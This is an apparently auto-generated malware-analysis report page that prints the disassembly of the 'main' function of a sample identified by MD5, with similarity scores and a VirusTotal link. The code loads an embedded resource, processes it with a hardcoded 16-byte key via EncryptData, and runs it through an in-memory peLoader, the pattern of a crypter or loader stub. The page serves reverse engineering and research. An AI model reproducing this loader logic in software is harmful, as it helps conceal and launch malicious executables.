---
layout: post
title:  "main @ 4fdefb3ce031161a7e55762168bb4eb9"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** main
- **Origin (md5):** 4fdefb3ce031161a7e55762168bb4eb9
- **VirusTotal:** [virustotal.com/gui/file/4fdefb3ce031161a7e55762168bb4eb9][virustotal_ref]

# Code Tags
<span class="tag" id="RESOURCE">RESOURCE</span>


# Similar Functions

1. [main][similar_1_ref] (sim.: 0.9327683135654489)
2. [fcn.00703b40][similar_2_ref] (sim.: 0.8771530998209185)
3. [fcn.00582350][similar_3_ref] (sim.: 0.8763174072032197)
4. [fcn.004336d0][similar_4_ref] (sim.: 0.8744843836438391)
5. [fcn.1400070a0][similar_5_ref] (sim.: 0.8719751618702534)


# Disassembled Code

{% highlight nasm %}
lea ecx,[esp+4]
and esp,0xfffffff0
push dword[ecx-4]
push ebp
mov ebp,esp
push edi
push esi
push ebx
push ecx
sub esp,0x88
mov dword[ebp-0x64],0x416dc0
mov dword[ebp-0x60],0x4173ca
lea eax,[ebp-0x5c]
lea ebx,[ebp-0x18]
mov dword[eax],ebx
mov edx,0x403256
mov dword[eax+4],edx
mov dword[eax+8],esp
lea eax,[ebp-0x7c]
mov dword[esp],eax
call dbg._Unwind_SjLj_Register
call dbg.__main
mov dword[ebp-0x40],0x62233c72
mov dword[ebp-0x3c],0x6c4c7671
mov dword[ebp-0x38],0x73563b4e
mov dword[ebp-0x34],0x3c3066
mov dword[esp+8],0x41d026
mov dword[esp+4],0x65
mov dword[esp],0
mov eax,dword[sym.imp.KERNEL32.dll_FindResourceA]
mov dword[ebp-0x78],1
call eax
sub esp,0xc
mov dword[ebp-0x20],eax
mov eax,dword[ebp-0x20]
mov dword[esp+4],eax
mov dword[esp],0
mov eax,dword[sym.imp.KERNEL32.dll_LoadResource]
call eax
sub esp,8
mov dword[ebp-0x24],eax
mov eax,dword[ebp-0x20]
mov dword[esp+4],eax
mov dword[esp],0
mov eax,dword[sym.imp.KERNEL32.dll_SizeofResource]
call eax
sub esp,8
mov dword[ebp-0x30],eax
mov eax,dword[ebp-0x30]
mov dword[esp],eax
call sym._malloc
mov dword[ebp-0x28],eax
mov eax,dword[ebp-0x24]
mov dword[esp],eax
mov eax,dword[sym.imp.KERNEL32.dll_LockResource]
call eax
sub esp,4
mov dword[ebp-0x2c],eax
mov dword[ebp-0x1c],0
jmp 0x4031fc
mov edx,dword[ebp-0x1c]
mov eax,dword[ebp-0x28]
add edx,eax
mov ecx,dword[ebp-0x1c]
mov eax,dword[ebp-0x2c]
add eax,ecx
movzx eax,byte[eax]
mov byte[edx],al
add dword[ebp-0x1c],1
mov eax,dword[ebp-0x30]
cmp dword[ebp-0x1c],eax
jl 0x4031e3
lea eax,[ebp-0x30]
mov dword[esp+0xc],eax
mov eax,dword[ebp-0x28]
mov dword[esp+8],eax
mov dword[esp+4],0x10
lea eax,[ebp-0x40]
mov dword[esp],eax
mov dword[ebp-0x78],1
call sym EncryptData(unsigned char*,int,unsigned char*,unsigned long*)
xor eax,1
test al,al
je 0x40323a
mov eax,1
jmp 0x403251
mov eax,dword[ebp-0x28]
mov dword[esp],eax
mov dword[ebp-0x78],1
call sym peLoader(unsigned char*)
mov eax,0
mov dword[ebp-0x80],eax
jmp 0x40326b
lea eax,[ebp-0x7c]
mov dword[esp],eax
call sym.__Unwind_SjLj_Unregister
mov eax,dword[ebp-0x80]
lea esp,[ebp-0x10]
pop ecx
pop ebx
pop esi
pop edi
pop ebp
lea esp,[ecx-4]
ret 
{% endhighlight %}


[similar_1_ref]: /report/main@db0bb0926cbc24a905ae237e61cb9c73
[similar_2_ref]: /report/fcn.00703b40@a5905e3c253c25bbaf727a1a18fe8ed1
[similar_3_ref]: /report/fcn.00582350@c92f0480e2fbc88393d2c65c08a235e0
[similar_4_ref]: /report/fcn.004336d0@46f6c2adf1fd4d1453ed312ca79dd9bf
[similar_5_ref]: /report/fcn.1400070a0@72082bb1b08918279d6780845b69f5ff
[virustotal_ref]: https://www.virustotal.com/gui/file/4fdefb3ce031161a7e55762168bb4eb9